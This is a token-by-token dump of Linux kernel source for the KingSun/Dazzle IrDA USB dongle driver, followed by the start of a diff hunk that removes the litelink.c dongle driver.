"dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "ksdazzle_send_irq", ":", "failed", "tx_urb", "submit", ":", "%", "d", "\\", "n", "\"", ",", "ret", ")", ";", "switch", "(", "ret", ")", "{", "case", "-", "ENODEV", ":", "case", "-", "EPIPE", ":", "break", ";", "default", ":", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "netif_start_queue", "(", "netdev", ")", ";", "}", "}", "}", "else", "{", "/", "*", "All", "data", "sent", ",", "send", "next", "speed", "&", "&", "wake", "network", "queue", "*", "/", "if", "(", "kingsun", "-", ">", "new_speed", "!", "=", "-", "1", "&", "&", "cpu_to_le32", "(", "kingsun", "-", ">", "new_speed", ")", "!", "=", "kingsun", "-", ">", "speedparams", ".", "baudrate", ")", "ksdazzle_change_speed", "(", "kingsun", ",", "kingsun", "-", ">", "new_speed", ")", ";", "netif_wake_queue", "(", "netdev", ")", ";", "}", "}", "}", "/", "*", "*", "Called", "from", "net", "/", "core", "when", "new", "frame", "is", "available", ".", "*", "/", "static", "netdev_tx_t", "ksdazzle_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "netdev", ")", "{", "struct", "ksdazzle_cb", "*", "kingsun", ";", "unsigned", "int", "wraplen", ";", "int", "ret", "=", "0", ";", "netif_stop_queue", "(", "netdev", ")", ";", "/", "*", "the", "IRDA", "wrapping", "routines", "don", "'", "t", "deal", "with", "non", "linear", "skb", "*", "/", "SKB_LINEAR_ASSERT", "(", "skb", ")", ";", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "spin_lock", "(", "&", "kingsun", "-", ">", "lock", ")", ";", "kingsun", "-", ">", "new_speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "/", "*", "Append", "data", "to", "the", "end", "of", "whatever", "data", "remains", "to", "be", "transmitted", "*", "/", "wraplen", "=", "async_wrap_skb", "(", "skb", ",", "kingsun", "-", ">", "tx_buf_clear", ",", "KINGSUN_SND_FIFO_SIZE", ")", ";", "kingsun", "-", ">", "tx_buf_clear_used", "=", "wraplen", ";", "if", "(", "(", "ret", "=", "ksdazzle_submit_tx_fragment", "(", "kingsun", ")", ")", "!", "=", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "ksdazzle_hard_xmit", ":", "failed", "tx_urb", "submit", ":", "%", "d", "\\", "n", "\"", ",", "ret", ")", ";", "switch", "(", "ret", ")", "{", "case", "-", "ENODEV", ":", "case", "-", "EPIPE", ":", "break", ";", "default", ":", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "netif_start_queue", "(", "netdev", ")", ";", "}", "}", "else", "{", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "netdev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "skb", "-", ">", "len", ";", "}", "dev_kfree_skb", "(", "skb", ")", ";", "spin_unlock", "(", "&", "kingsun", "-", ">", "lock", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "/", "*", "Receive", "callback", "function", "*", "/", "static", "void", "ksdazzle_rcv_irq", "(", "struct", "urb", "*", "urb", ")", "{", "struct", "ksdazzle_cb", "*", "kingsun", "=", "urb", "-", ">", "context", ";", "struct", "net_device", "*", "netdev", "=", "kingsun", "-", ">", "netdev", ";", "/", "*", "in", "process", "of", "stopping", ",", "just", "drop", "data", "*", "/", "if", "(", "!", "netif_running", "(", "netdev", ")", ")", "{", "kingsun", "-", ">", "receiving", "=", "0", ";", "return", ";", "}", "/", "*", "unlink", ",", "shutdown", ",", "unplug", ",", "other", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "ksdazzle_rcv_irq", ":", "urb", "asynchronously", "failed", "-", "%", "d", "\\", "n", "\"", ",", "urb", "-", ">", "status", ")", ";", "kingsun", "-", ">", "receiving", "=", "0", ";", "return", ";", "}", "if", "(", "urb", "-", ">", "actual_length", ">", "0", ")", "{", "__u8", "*", "bytes", "=", "urb", "-", ">", "transfer_buffer", ";", "unsigned", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "urb", "-", ">", "actual_length", ";", "i", "+", "+)", "{", "async_unwrap_char", "(", "netdev", ",", "&", "netdev", "-", ">", "stats", ",", "&", "kingsun", "-", ">", "rx_unwrap_buff", ",", "bytes", "[", "i", "]", ");", "}", "kingsun", "-", ">", "receiving", "=", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "state", "!", "=", "OUTSIDE_FRAME", ")", "?", "1", ":", "0", ";", "}", "/", "*", "This", "urb", "has", "already", "been", "filled", "in", "ksdazzle_net_open", ".", "It", "is", "assumed", "that", "urb", "keeps", "the", "pointer", "to", "the", "payload", "buffer", ".", "*", "/", "urb", "-", ">", "status", "=", "0", ";", "usb_submit_urb", "(", "urb", ",", "GFP_ATOMIC", ")", ";", "}", "/", "*", "*", "Function", "ksdazzle_net_open", "(", "dev", ")", "*", "*", "Network", "device", "is", "taken", "up", ".", "Usually", "this", "is", "done", "by", "\"", "ifconfig", "irda0", "up", "\"", "*", "/", "static", "int", "ksdazzle_net_open", "(", "struct", "net_device", "*", "netdev", ")", "{", "struct", "ksdazzle_cb", "*", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "int", "err", "=", "-", "ENOMEM", ";", "char", "hwname", "[", "16", "]", ";", "/", "*", "At", "this", "point", ",", "urbs", "are", "NULL", ",", "and", "skb", "is", "NULL", "(", "see", "ksdazzle_probe", ")", "*", "/", "kingsun", "-", ">", "receiving", "=", "0", ";", "/", "*", "Initialize", "for", "SIR", "to", "copy", "data", "directly", "into", "skb", ".", "*", "/", "kingsun", "-", ">", "rx_unwrap_buff", ".", "in_frame", "=", "FALSE", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "truesize", "=", "IRDA_SKB_MAX_MTU", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "=", "dev_alloc_skb", "(", "IRDA_SKB_MAX_MTU", ")", ";", "if", "(", "!", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ")", "goto", "free_mem", ";", "skb_reserve", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ",", "1", ")", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "head", "=", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "-", ">", "data", ";", "kingsun", "-", ">", "rx_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "rx_urb", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "tx_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "tx_urb", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "speed_urb", "=", "usb_alloc_urb", "(", "0", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "speed_urb", ")", "goto", "free_mem", ";", "/", "*", "Initialize", "speed", "for", "dongle", "*", "/", "kingsun", "-", ">", "new_speed", "=", "9600", ";", "err", "=", "ksdazzle_change_speed", "(", "kingsun", ",", "9600", ")", ";", "if", "(", "err", "<", "0", ")", "goto", "free_mem", ";", "/", "*", "*", "Now", "that", "everything", "should", "be", "initialized", "properly", ",", "*", "Open", "new", "IrLAP", "layer", "instance", "to", "take", "care", "of", "us", ".", "..", "*", "/", "sprintf", "(", "hwname", ",", "\"", "usb", "#", "%", "d", "\"", ",", "kingsun", "-", ">", "usbdev", "-", ">", "devnum", ")", ";", "kingsun", "-", ">", "irlap", "=", "irlap_open", "(", "netdev", ",", "&", "kingsun", "-", ">", "qos", ",", "hwname", ")", ";", "if", "(", "!", "kingsun", "-", ">", "irlap", ")", "{", "err", "=", "-", "ENOMEM", ";", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "irlap_open", "failed", "\\", "n", "\"", ");", "goto", "free_mem", ";", "}", "/", "*", "Start", "reception", ".", "*", "/", "usb_fill_int_urb", "(", "kingsun", "-", ">", "rx_urb", ",", "kingsun", "-", ">", "usbdev", ",", "usb_rcvintpipe", "(", "kingsun", "-", ">", "usbdev", ",", "kingsun", "-", ">", "ep_in", ")", ",", "kingsun", "-", ">", "rx_buf", ",", "KINGSUN_RCV_MAX", ",", "ksdazzle_rcv_irq", ",", "kingsun", ",", "1", ")", ";", "kingsun", "-", ">", "rx_urb", "-", ">", "status", "=", "0", ";", "err", "=", "usb_submit_urb", "(", "kingsun", "-", ">", "rx_urb", ",", "GFP_KERNEL", ")", ";", "if", "(", "err", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "first", "urb", "-", "submit", "failed", ":", "%", "d", "\\", "n", "\"", ",", "err", ")", ";", "goto", "close_irlap", ";", "}", "netif_start_queue", "(", "netdev", ")", ";", "/", "*", "Situation", "at", "this", "point", ":", "-", "all", "work", "buffers", "allocated", "-", "urbs", "allocated", "and", "ready", "to", "fill", "-", "max", "rx", "packet", "known", "(", "in", "max_rx", ")", "-", "unwrap", "state", "machine", "initialized", ",", "in", "state", "outside", "of", "any", "frame", "-", "receive", "request", "in", "progress", "-", "IrLAP", "layer", "started", ",", "about", "to", "hand", "over", "packets", "to", "send", "*", "/", "return", "0", ";", "close_irlap", ":", "irlap_close", "(", "kingsun", "-", ">", "irlap", ")", ";", "free_mem", ":", "usb_free_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "kingsun", "-", ">", "speed_urb", "=", "NULL", ";", "usb_free_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "usb_free_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "if", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ")", "{", "kfree_skb", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ")", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "=", "NULL", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "head", "=", "NULL", ";", "}", "return", "err", ";", "}", "/", "*", "*", "Function", "ksdazzle_net_close", "(", "dev", ")", "*", "*", "Network", "device", "is", "taken", "down", ".", "Usually", "this", "is", "done", "by", "*", "\"", "ifconfig", "irda0", "down", "\"", "*", "/", "static", "int", "ksdazzle_net_close", "(", "struct", "net_device", "*", "netdev", ")", "{", "struct", "ksdazzle_cb", "*", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "/", "*", "Stop", "transmit", "processing", "*", "/", "netif_stop_queue", "(", "netdev", ")", ";", "/", "*", "Mop", "up", "receive", "&", "&", "transmit", "urb", "'", "s", "*", "/", "usb_kill_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "usb_kill_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "kingsun", "-", ">", "speed_urb", "=", "NULL", ";", "usb_kill_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "kfree_skb", "(", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", ")", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "=", "NULL", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "head", "=", "NULL", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "in_frame", "=", "FALSE", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "kingsun", "-", ">", "receiving", "=", "0", ";", "/", "*", "Stop", "and", "remove", "instance", "of", "IrLAP", "*", "/", "irlap_close", "(", "kingsun", "-", ">", "irlap", ")", ";", "kingsun", "-", ">", "irlap", "=", "NULL", ";", "return", "0", ";", "}", "/", "*", "*", "IOCTLs", ":", "Extra", "out", "-", "of", "-", "band", "network", "commands", ".", "..", "*", "/", "static", "int", "ksdazzle_net_ioctl", "(", "struct", "net_device", "*", "netdev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "irq", "=", "(", "struct", "if_irda_req", "*", ")", "rq", ";", "struct", "ksdazzle_cb", "*", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "int", "ret", "=", "0", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "/", "*", "Set", "bandwidth", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "/", "*", "Check", "if", "the", "device", "is", "still", "there", "*", "/", "if", "(", "netif_device_present", "(", "kingsun", "-", ">", "netdev", ")", ")", "return", "ksdazzle_change_speed", "(", "kingsun", ",", "irq", "-", ">", "ifr_baudrate", ")", ";", "break", ";", "case", "SIOCSMEDIABUSY", ":", "/", "*", "Set", "media", "busy", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "/", "*", "Check", "if", "the", "IrDA", "stack", "is", "still", "there", "*", "/", "if", "(", "netif_running", "(", "kingsun", "-", ">", "netdev", ")", ")", "irda_device_set_media_busy", "(", "kingsun", "-", ">", "netdev", ",", "TRUE", ")", ";", "break", ";", "case", "SIOCGRECEIVING", ":", "/", "*", "Only", "approximately", "true", "*", "/", "irq", "-", ">", "ifr_receiving", "=", "kingsun", "-", ">", "receiving", ";", "break", ";", "default", ":", "ret", "=", "-", "EOPNOTSUPP", ";", "}", "return", "ret", ";", "}", "static", "const", "struct", "net_device_ops", "ksdazzle_ops", "=", "{", ".", "ndo_start_xmit", "=", "ksdazzle_hard_xmit", ",", ".", "ndo_open", "=", "ksdazzle_net_open", ",", ".", "ndo_stop", "=", "ksdazzle_net_close", ",", ".", "ndo_do_ioctl", "=", "ksdazzle_net_ioctl", ",", "}", ";", "/", "*", "*", "This", "routine", "is", "called", "by", "the", "USB", "subsystem", "for", "each", "new", "device", "*", "in", "the", "system", ".", "We", "need", "to", "check", "if", "the", "device", "is", "ours", ",", "and", "in", "*", "this", "case", "start", "handling", "it", ".", "*", "/", "static", "int", "ksdazzle_probe", "(", "struct", "usb_interface", "*", "intf", ",", "const", "struct", "usb_device_id", "*", "id", ")", "{", "struct", "usb_host_interface", "*", "interface", ";", "struct", "usb_endpoint_descriptor", "*", "endpoint", ";", "struct", "usb_device", "*", "dev", "=", "interface_to_usbdev", "(", "intf", ")", ";", "struct", "ksdazzle_cb", "*", "kingsun", "=", "NULL", ";", "struct", "net_device", "*", "net", "=", "NULL", ";", "int", "ret", "=", "-", "ENOMEM", ";", "int", "pipe", ",", "maxp_in", ",", "maxp_out", ";", "__u8", "ep_in", ";", "__u8", "ep_out", ";", "/", "*", "Check", "that", "there", "really", "are", "two", "interrupt", "endpoints", ".", "Check", "based", "on", "the", "one", "in", "drivers", "/", "usb", "/", "input", "/", "usbmouse", ".", "c", "*", "/", "interface", "=", "intf", "-", ">", "cur_altsetting", ";", "if", "(", "interface", "-", ">", "desc", ".", "bNumEndpoints", "!", "=", "2", ")", "{", "dev_err", "(", "&", "intf", "-", ">", "dev", ",", "\"", "ksdazzle", ":", "expected", "2", "endpoints", ",", "found", "%", "d", "\\", "n", "\"", ",", "interface", "-", ">", "desc", ".", "bNumEndpoints", ")", ";", "return", "-", "ENODEV", ";", "}", "endpoint", "=", "&", "interface", "-", ">", "endpoint", "[", "KINGSUN_EP_IN", "]", ".", "desc", ";", "if", "(", "!", "usb_endpoint_is_int_in", "(", "endpoint", ")", ")", "{", "dev_err", "(", "&", "intf", "-", ">", "dev", ",", "\"", "ksdazzle", ":", "endpoint", "0", "is", "not", "interrupt", "IN", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "ep_in", "=", "endpoint", "-", ">", "bEndpointAddress", ";", "pipe", "=", "usb_rcvintpipe", "(", "dev", ",", "ep_in", ")", ";", "maxp_in", "=", "usb_maxpacket", "(", "dev", ",", "pipe", ",", "usb_pipeout", "(", "pipe", ")", ");", "if", "(", "maxp_in", ">", "255", "|", "|", "maxp_in", "<", "=", "1", ")", "{", "dev_err", "(", "&", "intf", "-", ">", "dev", ",", "\"", "ksdazzle", ":", "endpoint", "0", "has", "max", "packet", "size", "%", "d", "not", "in", "range", "[", "2", ".", ".", "255", "]", "\\", "n", "\"", ",", "maxp_in", ")", ";", "return", "-", "ENODEV", ";", "}", "endpoint", "=", "&", "interface", "-", ">", "endpoint", "[", "KINGSUN_EP_OUT", "]", ".", "desc", ";", "if", "(", "!", "usb_endpoint_is_int_out", "(", "endpoint", ")", ")", "{", "dev_err", "(", "&", "intf", "-", ">", "dev", ",", "\"", "ksdazzle", ":", "endpoint", "1", "is", "not", "interrupt", "OUT", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "ep_out", "=", "endpoint", "-", ">", "bEndpointAddress", ";", "pipe", "=", "usb_sndintpipe", "(", "dev", ",", "ep_out", ")", ";", "maxp_out", "=", "usb_maxpacket", "(", "dev", ",", "pipe", ",", "usb_pipeout", "(", "pipe", ")", ");", "/", "*", "Allocate", "network", "device", "container", ".", "*", "/", "net", "=", "alloc_irdadev", "(", "sizeof", "(", "*", "kingsun", ")", ");", "if", "(", "!", "net", ")", "goto", "err_out1", ";", "SET_NETDEV_DEV", "(", "net", ",", "&", "intf", "-", ">", "dev", ")", ";", "kingsun", "=", "netdev_priv", "(", "net", ")", ";", "kingsun", "-", ">", "netdev", "=", "net", ";", "kingsun", "-", ">", "usbdev", "=", "dev", ";", "kingsun", "-", ">", "ep_in", "=", "ep_in", ";", "kingsun", "-", ">", "ep_out", "=", "ep_out", ";", "kingsun", "-", ">", "irlap", "=", "NULL", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "kingsun", "-", ">", "tx_buf_clear", "=", "NULL", ";", "kingsun", "-", ">", "tx_buf_clear_used", "=", "0", ";", "kingsun", "-", ">", "tx_buf_clear_sent", "=", "0", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "kingsun", "-", ">", "rx_buf", "=", "NULL", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "in_frame", "=", "FALSE", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "=", "NULL", ";", "kingsun", "-", ">", "receiving", "=", "0", ";", "spin_lock_init", "(", "&", "kingsun", "-", ">", "lock", ")", ";", "kingsun", "-", ">", "speed_setuprequest", "=", "NULL", ";", "kingsun", "-", ">", "speed_urb", "=", "NULL", ";", "kingsun", "-", ">", "speedparams", ".", "baudrate", "=", "0", ";", "/", "*", "Allocate", "input", "buffer", "*", "/", "kingsun", "-", ">", "rx_buf", "=", "kmalloc", "(", "KINGSUN_RCV_MAX", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "rx_buf", ")", "goto", "free_mem", ";", "/", "*", "Allocate", "output", "buffer", "*", "/", "kingsun", "-", ">", "tx_buf_clear", "=", "kmalloc", "(", "KINGSUN_SND_FIFO_SIZE", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "tx_buf_clear", ")", "goto", "free_mem", ";", "/", "*", "Allocate", "and", "initialize", "speed", "setup", "packet", "*", "/", "kingsun", "-", ">", "speed_setuprequest", "=", "kmalloc", "(", "sizeof", "(", "struct", "usb_ctrlrequest", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "speed_setuprequest", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "bRequestType", "=", "USB_DIR_OUT", "|", "USB_TYPE_CLASS", "|", "USB_RECIP_INTERFACE", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "bRequest", "=", "KINGSUN_REQ_SEND", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "wValue", "=", "cpu_to_le16", "(", "0x0200", ")", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "wIndex", "=", "cpu_to_le16", "(", "0x0001", ")", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "wLength", "=", "cpu_to_le16", "(", "sizeof", "(", "struct", "ksdazzle_speedparams", ")", ");", "printk", "(", "KERN_INFO", "\"", "KingSun", "/", "Dazzle", "IRDA", "/", "USB", "found", "at", "address", "%", "d", ",", "\"", "\"", "Vendor", ":", "%", "x", ",", "Product", ":", "%", "x", "\\", "n", "\"", ",", "dev", "-", ">", "devnum", ",", "le16_to_cpu", "(", "dev", "-", ">", "descriptor", ".", "idVendor", ")", ",", "le16_to_cpu", "(", "dev", "-", ">", "descriptor", ".", "idProduct", ")", ");", "/", "*", "Initialize", "QoS", "for", "this", "device", "*", "/", "irda_init_max_qos_capabilies", "(", "&", "kingsun", "-", ">", "qos", ")", ";", "/", "*", "Baud", "rates", "known", "to", "be", "supported", ".", "Please", "uncomment", "if", "devices", "(", "other", "than", "a", "SonyEriccson", "K300", "phone", ")", "can", "be", "shown", "to", "support", "higher", "speeds", "with", "this", "dongle", ".", "*", "/", "kingsun", "-", ">", "qos", ".", "baud_rate", ".", "bits", "=", "IR_2400", "|", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", ";", "kingsun", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "&", "=", "KINGSUN_MTT", ";", "irda_qos_bits_to_value", "(", "&", "kingsun", "-", ">", "qos", ")", ";", "/", "*", "Override", "the", "network", "functions", "we", "need", "to", "use", "*", "/", "net", "-", ">", "netdev_ops", "=", "&", "ksdazzle_ops", ";", "ret", "=", "register_netdev", "(", "net", ")", ";", "if", "(", "ret", "!", "=", "0", ")", "goto", "free_mem", ";", "dev_info", "(", "&", "net", "-", ">", "dev", ",", "\"", "IrDA", ":", "Registered", "KingSun", "/", "Dazzle", "device", "%", "s", "\\", "n", "\"", ",", "net", "-", ">", "name", ")", ";", "usb_set_intfdata", "(", "intf", ",", "kingsun", ")", ";", "/", "*", "Situation", "at", "this", "point", ":", "-", "all", "work", "buffers", "allocated", "-", "setup", "requests", "pre", "-", "filled", "-", "urbs", "not", "allocated", ",", "set", "to", "NULL", "-", "max", "rx", "packet", "known", "(", "is", "KINGSUN_FIFO_SIZE", ")", "-", "unwrap", "state", "machine", "(", "partially", ")", "initialized", ",", "but", "skb", "=", "=", "NULL", "*", "/", "return", "0", ";", "free_mem", ":", "kfree", "(", "kingsun", "-", ">", "speed_setuprequest", ")", ";", "kfree", "(", "kingsun", "-", ">", "tx_buf_clear", ")", ";", "kfree", "(", "kingsun", "-", ">", "rx_buf", ")", ";", "free_netdev", "(", "net", ")", ";", "err_out1", ":", "return", "ret", ";", "}", "/", "*", "*", "The", "current", "device", "is", "removed", ",", "the", "USB", "layer", "tell", "us", "to", "shut", "it", "down", ".", "..", "*", "/", "static", "void", "ksdazzle_disconnect", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "ksdazzle_cb", "*", "kingsun", "=", "usb_get_intfdata", "(", "intf", ")", ";", "if", "(", "!", "kingsun", ")", "return", ";", "unregister_netdev", "(", "kingsun", "-", ">", "netdev", ")", ";", "/", "*", "Mop", "up", "receive", "&", "&", "transmit", "urb", "'", "s", "*", "/", "usb_kill_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "kingsun", "-", ">", "speed_urb", "=", "NULL", ";", "usb_kill_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "usb_kill_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "kfree", "(", "kingsun", "-", ">", "speed_setuprequest", ")", ";", "kfree", "(", "kingsun", "-", ">", "tx_buf_clear", ")", ";", "kfree", "(", "kingsun", "-", ">", "rx_buf", ")", ";", "free_netdev", "(", "kingsun", "-", ">", "netdev", ")", ";", "usb_set_intfdata", "(", "intf", ",", "NULL", ")", ";", "}", "#", "ifdef", "CONFIG_PM", "/", "*", "USB", "suspend", ",", "so", "power", "off", "the", "transmitter", "/", "receiver", "*", "/", "static", "int", "ksdazzle_suspend", "(", "struct", "usb_interface", "*", "intf", ",", "pm_message_t", "message", ")", "{", "struct", "ksdazzle_cb", "*", "kingsun", "=", "usb_get_intfdata", "(", "intf", ")", ";", "netif_device_detach", "(", "kingsun", "-", ">", "netdev", ")", ";", "if", "(", "kingsun", "-", ">", "speed_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "if", "(", "kingsun", "-", ">", "tx_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "if", "(", "kingsun", "-", ">", "rx_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "return", "0", ";", "}", "/", "*", "Coming", "out", "of", "suspend", ",", "so", "reset", "hardware", "*", "/", "static", "int", "ksdazzle_resume", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "ksdazzle_cb", "*", "kingsun", "=", "usb_get_intfdata", "(", "intf", ")", ";", "if", "(", "kingsun", "-", ">", "rx_urb", "!", "=", "NULL", ")", "{", "/", "*", "Setup", "request", "already", "filled", "in", "ksdazzle_probe", "*", "/", "usb_submit_urb", "(", "kingsun", "-", ">", "rx_urb", ",", "GFP_KERNEL", ")", ";", "}", "netif_device_attach", "(", "kingsun", "-", ">", "netdev", ")", ";", "return", "0", ";", "}", "#", "endif", "/", "*", "*", "USB", "device", "callbacks", "*", "/", "static", "struct", "usb_driver", "irda_driver", "=", "{", ".", "name", "=", "\"", "ksdazzle", "-", "sir", "\"", ",", ".", "probe", "=", "ksdazzle_probe", ",", ".", "disconnect", "=", "ksdazzle_disconnect", ",", ".", "id_table", "=", "dongles", ",", "#", "ifdef", "CONFIG_PM", ".", "suspend", "=", "ksdazzle_suspend", ",", ".", "resume", "=", "ksdazzle_resume", ",", "#", "endif", "}", ";", "module_usb_driver", "(", "irda_driver", ")", ";", "MODULE_AUTHOR", "(", "\"", "Alex", "Villac", "\u00ed", "s", "Lasso", "<", "a_villacis", "@", "palosanto", ".", "com", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "IrDA", "-", "USB", "Dongle", "Driver", "for", "KingSun", "Dazzle", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "@", "@", "-", "1", ",", "199", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "litelink", ".", "c", "*", "Version", ":", "1", ".", "1", "*", "Description", ":", "Driver", "for", "the", "Parallax", "LiteLink", "dongle", "*", "Status", ":", "Stable", "*", "Author", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "Created", "at", ":", "Fri", "May", "7", "12", ":", "50", ":", "33", "1999", "*", "Modified", "at", ":", "Fri", "Dec", "17", "09", ":", "14", ":", "23", "1999", "*", "Modified", "by", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "*", "Copyright", "(", "c", ")", "1999", "Dag", "Brattli", ",", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "see", "<", "http", ":", "//", "www", ".", "gnu", ".", "org", "/", "licenses", "/", ">.", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "*", "Modified", "at", ":", "Thu", "Jan", "15", "2003", "*", "Modified", "by", ":", "Eugene", "Crosser", "<", "crosser", "@", "average", ".", "org", ">", "*", "*", "Convert", "to", "\"", "new", "\"", "IRDA", "infrastructure", "for", "kernel", "2", ".", "6", "*", "/", "#", 